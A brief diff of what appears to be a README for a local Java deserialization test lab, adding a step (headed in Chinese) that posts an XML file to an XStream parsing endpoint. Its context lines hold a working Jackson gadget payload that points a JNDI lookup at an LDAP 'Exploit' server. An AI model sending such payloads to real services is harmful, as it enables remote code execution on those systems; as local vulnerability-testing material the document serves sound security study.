@@ -47,5 +47,7 @@
    ```
    curl 127.0.0.1:8080/jackson/parse -d 'json=["com.newrelic.agent.deps.ch.qos.logback.core.db.JNDIConnectionSource",{"jndiLocation":"ldap://127.0.0.1:1389/Exploit"}]'
    ```
-
-
+13. 测试xstream反序列化
+   ```
+   curl 127.0.0.1:8080/xstream/parse -H 'Content-Type: text/xml' -d @test.xml
+   ```
